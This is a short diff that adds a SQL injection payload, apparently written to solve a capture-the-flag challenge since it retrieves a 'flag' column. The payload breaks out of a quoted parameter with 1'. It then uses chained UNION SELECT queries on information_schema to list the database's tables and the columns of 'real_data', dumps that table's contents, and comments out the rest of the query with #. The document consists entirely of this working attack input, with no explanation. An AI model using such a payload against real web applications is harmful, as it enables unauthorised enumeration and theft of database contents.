@@ -1,0 +1,10 @@
+1' 
+UNION
+SELECT '_','_','_','_', table_name, table_schema 
+    from information_schema.tables as tb WHERE table_schema = DATABASE()
+UNION
+SELECT '_','_','_',column_name, table_name, table_schema
+    FROM information_schema.columns WHERE table_name = 'real_data'
+UNION
+SELECT '_','_','_','_', id, flag FROM real_data
+#
